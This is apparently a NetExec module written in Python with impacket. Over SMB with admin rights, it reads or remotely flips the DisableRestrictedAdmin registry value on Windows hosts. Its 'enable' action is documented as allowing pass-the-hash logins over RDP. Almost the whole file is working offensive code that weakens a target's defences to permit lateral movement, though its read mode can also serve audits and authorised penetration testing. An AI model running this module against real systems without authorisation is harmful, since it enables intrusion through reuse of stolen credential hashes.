import sys
from impacket.dcerpc.v5 import rrp
from impacket.examples.secretsdump import RemoteOperations

class NXCModule:
    name = "restrictedadmin"
    description = "Perform actions (enable/disable) on DisableRestrictedAdmin reg key"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
    
    def options(self, context, module_options):
        '''
        Mode read See the value of the registry key and deduce if PTH is is possible or not
        Mode enable Set value to 0, that will enable the security option "RestricedAdmin" and allow PTH on RDP
        Mode disable Set value to 1, PTH will be no longer possible

        ACTION:     "read" or "enable" or "disable" 
        '''
        self.action = None
        if "ACTION" not in module_options:
            self.action = "read" # DEFAULT MODE
        if "ACTION" in module_options:
            if module_options["ACTION"] == "enable":
                self.action = "enable"
            if module_options["ACTION"] == "disable":
                self.action = "disable"
            if module_options["ACTION"] == "read":
                self.action = "read"

    def on_admin_login(self, context, connection):

        if self.action == "read":
            # READ MODE
            read = self.check_status(context, connection)
            if read == 1: 
                context.log.fail(f"DisableRestrictedAdmin key is set to 0x{read}, PTH on RDP is not allowed.")
            if read == 0:
                context.log.highlight(f"DisableRestrictedAdmin key is set to 0x{read}, PTH on RDP is allowed.")
            if read != 0 and read != 1:
                context.log.error("Error unknown value on regkey : %s" % str(read)) 
        if self.action == "enable":
            # ENABLE MODE
            enable = self.enable(context, connection)
            if enable is True:
                if self.check_status(context, connection) == 0:
                    context.log.highlight("Operation completed successfully.")
                else:
                    context.log.error("Error unknown value on regkey : %s" % str(read))
        if self.action == "disable":
            # DISABLE MODE
            disable = self.disable(context, connection)
            if disable is True:
                if self.check_status(context, connection) == 1:
                    context.log.highlight("Operation completed successfully.")
                else:
                    context.log.error("Error unknown value on regkey : %s" % str(read))


    def check_status(self, context, connection):
        
        try:
            remoteOps  = RemoteOperations(connection.conn, False)
            remoteOps.enableRegistry()

            # HKLM Access
            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
            regHandle = ans["phKey"]

            # registry path AND open registry
            registry_path = "System\\CurrentControlSet\\Control\\Lsa"
            keyHandle = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, registry_path)["phkResult"]

            try:
                query = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "DisableRestrictedAdmin\x00")
                return query[1]                
            except Exception as e:
                context.log.error("RemoteOperations failed: %s" % str(e))
                sys.exit(1) 

        except Exception as e:
                context.log.error("RemoteOperations failed: %s" % str(e))
                sys.exit(1)

        finally:
            # CLODE HANDLE
            rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)

    
    def enable(self, context, connection):
        
        try:
            remoteOps = RemoteOperations(connection.conn, False)
            remoteOps.enableRegistry()

            # HKLM Access
            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
            regHandle = ans["phKey"]

            # registry path AND open registry
            registry_path = "System\\CurrentControlSet\\Control\\Lsa"
            keyHandle = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, registry_path)["phkResult"]

            try:
                rrp.hBaseRegSetValue(remoteOps._RemoteOperations__rrp, keyHandle, "DisableRestrictedAdmin\x00", rrp.REG_DWORD, 0)
                return True                
            except Exception as e:
                context.log.error("RemoteOperations failed: %s" % str(e))
                sys.exit(1) 

        except Exception as e:
                context.log.error("RemoteOperations failed: %s" % str(e))
                sys.exit(1)

        finally:
            # CLODE HANDLE
            rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)

    
    def disable(self, context, connection):
        
        try:
            remoteOps = RemoteOperations(connection.conn, False)
            remoteOps.enableRegistry()

            # HKLM Access
            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
            regHandle = ans["phKey"]

            # registry path AND open registry
            registry_path = "System\\CurrentControlSet\\Control\\Lsa"
            keyHandle = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, registry_path)["phkResult"]

            try:
                rrp.hBaseRegSetValue(remoteOps._RemoteOperations__rrp, keyHandle, "DisableRestrictedAdmin\x00", rrp.REG_DWORD, 1)
                return True                
            except Exception as e:
                context.log.error("RemoteOperations failed: %s" % str(e))
                sys.exit(1) 

        except Exception as e:
                context.log.error("RemoteOperations failed: %s" % str(e))
                sys.exit(1)

        finally:
            # CLODE HANDLE
            rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
